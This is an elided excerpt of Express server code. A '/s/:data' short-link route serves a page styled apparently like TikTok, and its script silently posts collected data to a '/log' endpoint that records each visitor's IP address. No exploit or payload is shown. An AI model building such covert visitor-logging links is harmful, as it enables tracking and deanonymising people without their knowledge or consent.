...
app.get('/s/:data', async (req, res) => {
    ...
    <head>  
        ...
        <style>  
            :root { --bg-color: #000000; --primary-color: #ff0050; --secondary-color: #00f2ea; --white: #ffffff; }  
            body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: var(--bg-color); font-family: 'Poppins', sans-serif; overflow: hidden; }  
    ...
    <body>  
        ...
        <script>  
            ...
            async function logData(data) {  
                try { await fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) {}  
            }  
...
app.post('/log', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-real-ip'] || req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
